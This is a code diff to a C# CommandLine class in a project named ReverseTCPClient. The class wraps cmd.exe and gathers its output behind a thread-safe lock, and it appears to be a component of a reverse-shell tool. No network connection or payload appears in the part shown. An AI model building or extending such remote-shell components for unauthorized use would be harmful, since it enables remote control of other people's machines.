@@ -6,7 +6,8 @@ namespace ReverseTCPClient
     class CommandLine
     {
         //Variable containg data output by the current process line by line.
-        public List<string> outputRecieved = new List<string>();
+        static object outputLock = new object();
+        private string outputRecieved = "";
         private Process CommandInterface = new Process();
 
         public CommandLine(string filename = "CMD.exe")
@@ -21,13 +22,22 @@ namespace ReverseTCPClient
             startInfo.UseShellExecute = false;
             CommandInterface.StartInfo = startInfo;
             //Setting up event listeners to output data to global variable when received. 
-            CommandInterface.OutputDataReceived += (sender, lineReceived) => outputRecieved.Add(lineReceived.Data);
-            CommandInterface.ErrorDataReceived += (sender, lineReceived) => outputRecieved.Add(lineReceived.Data);
+            CommandInterface.OutputDataReceived += dataReceieved;
+            CommandInterface.ErrorDataReceived += dataReceieved;
             CommandInterface.Start();
             //Beginning event listeners
             CommandInterface.BeginOutputReadLine();
             CommandInterface.BeginErrorReadLine();
         }
+
+        void dataReceieved(object sender, DataReceivedEventArgs line)
+        {
+            lock (outputLock)
+            {
+                outputRecieved += (line.Data + "\n");
+            }
+        }
+
         /// <summary>
         /// Runs a given command in the application that is running.
         /// </summary>
@@ -48,5 +58,16 @@ namespace ReverseTCPClient
             CommandInterface.CancelErrorRead();
         }
 
+        public string dataReturned()
+        {
+            string output = "";
+            lock (outputLock)
+            {
+                output = outputRecieved;
+                outputRecieved = "";
+            }
+
+            return output;
+        }
     }
 }
